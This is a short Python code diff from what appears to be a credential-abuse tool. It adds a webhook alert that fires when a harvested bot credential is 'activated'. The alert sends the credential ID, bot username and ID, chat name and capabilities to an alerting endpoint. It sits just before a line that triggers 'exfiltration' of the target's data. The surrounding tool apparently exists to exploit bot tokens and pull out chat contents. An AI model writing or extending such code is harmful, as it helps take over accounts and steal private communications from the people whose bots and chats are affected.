@@ -904,6 +904,23 @@ async def _enrich_logic(cred_id: str):
         "chat_id": first_chat["id"],
         "meta": meta_payload,
     }).eq("id", cred_id))
+
+    # Fire webhook alert (fire-and-forget — never blocks enrich)
+    try:
+        from app.core.webhook import dispatch_alert as _dispatch_alert
+        from datetime import datetime, timezone as _tz
+        await _dispatch_alert({
+            "event": "credential_activated",
+            "timestamp": datetime.now(_tz.utc).isoformat(),
+            "credential_id": cred_id,
+            "bot_username": bot_username,
+            "bot_id": str(bot_id),
+            "chat_id": first_chat["id"],
+            "chat_name": first_chat["name"],
+            "capabilities": meta_payload.get("capabilities", {}),
+        })
+    except Exception as _wh_exc:
+        logger.debug(f"[Webhook] dispatch_alert failed: {_wh_exc}")
     
     # Trigger Exfiltration for Primary
     logger.info(f"🚀 [Enrich] Triggering exfiltration for {cred_id}...")
